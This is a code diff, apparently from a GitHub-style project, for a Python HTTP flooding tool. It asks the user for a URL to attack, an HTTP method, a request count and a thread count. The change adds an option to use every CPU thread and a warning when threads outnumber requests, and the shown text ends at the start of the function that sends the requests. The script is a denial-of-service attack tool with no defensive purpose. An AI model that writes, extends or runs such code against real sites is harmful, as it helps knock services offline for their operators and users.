@@ -20,9 +20,13 @@ ____  ____   ___  ____       _  _____ _____  _    ____ _  __
 url = input(green + "Enter the URL to attack: ")
 method = input(green + "Enter the HTTP method (GET/POST/FETCH): ").upper()
 total_requests = int(input(green + "Enter the total number of requests to send: "))
-num_threads = int(input(green + "Enter the number of threads to use: "))
+num_threads = int(input(green + "Enter the number of threads to use or send 999 to select all threads: "))
 input(green + "Are you sure you want to attack this URL? (Press Enter to continue)")
 os.system("cls" if os.name == "nt" else "clear")
+if num_threads >= os.cpu_count():
+    num_threads = os.cpu_count()
+if num_threads >= total_requests:
+    print(red + "You have selected more threads than total requests.")
 
 def send_requests(requests_per_thread, thread_id):
     for i in range(requests_per_thread):
